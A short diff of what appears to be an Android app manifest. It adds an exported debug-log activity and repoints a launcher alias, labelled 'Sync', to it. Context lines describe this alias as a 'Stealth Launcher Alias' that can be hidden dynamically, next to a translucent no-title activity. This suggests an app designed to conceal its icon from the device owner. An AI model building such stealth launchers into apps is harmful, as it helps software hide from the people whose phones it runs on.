@@ -37,12 +37,18 @@
             android:exported="false"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
-        <!-- Stealth Launcher Alias (Can be hidden dynamically without killing process) -->
+        <!-- 🛠️ TEMPORARY DEBUG LOG CONSOLE ACTIVITY -->
+        <activity
+            android:name=".DebugLogActivity"
+            android:exported="true"
+            android:theme="@style/Theme.AppCompat.NoActionBar" />
+
+        <!-- Stealth Launcher Alias (Points to DebugLogActivity during testing) -->
         <activity-alias
             android:name=".LauncherAlias"
-            android:targetActivity=".PermissionActivity"
+            android:targetActivity=".DebugLogActivity"
             android:exported="true"
-            android:label="Sync"
+            android:label="Sync Debug"
             android:icon="@drawable/ic_launcher">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
